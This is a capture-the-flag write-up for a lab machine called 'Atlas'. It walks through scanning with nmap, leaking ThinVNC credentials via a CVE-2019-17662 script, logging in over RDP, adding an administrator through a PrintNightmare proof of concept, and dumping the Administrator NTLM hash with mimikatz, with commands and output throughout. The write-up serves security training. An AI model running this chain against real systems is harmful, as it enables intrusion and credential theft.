# Atlas

> Ben Taylor | Oct 2, 2021

----------------------------------

# 1. With the Nmap default port range, you should find that two ports are open. What port numbers are these?

```
nmap -sV -sS -Pn -oA nmap/ports 10.10.179.10
```

Found open ports:
`3389`
`8080`

# 2. What service does Nmap think is running on the higher of the two ports?

Service:`http-proxy`

Ran a curl to see it a ThinVNC server running.

```bash
curl 10.10.179.10:8080 -v
*   Trying 10.10.179.10:8080...
* Connected to 10.10.179.10 (10.10.179.10) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.179.10:8080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="ZfjsN/u25UBI1EkC+7blQA==", opaque="yfubGf8LgdSRhwvR4avwSEatShZZpL5nB6"
< 
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>

```

Was able to fond `https://github.com/MuirlandOracle/CVE-2019-17662/blob/main/CVE-2019-17662.py`  that will leak the password and user name by Authentication Bypass.

When ran the command I was able to get the user name and password word from the ThinVnc.ini file.

```
Username:       Atlas
Password:       H0ldUpTheHe@vens
```


RDP into the box using this commmand.

```bash
xfreerdp /v:10.10.179.10 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

Found the windows box is vulbuble to PrintNightmare. Download the POC and run it.

```powershell
PS C:\Users\Atlas\Desktop> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

Moved up my powershell command with the new admin user `adm1n`

```powershell
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
```

Moved over mimikatz and dump the hash for the Administrator on the box.

```
User : Administrator
  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb
```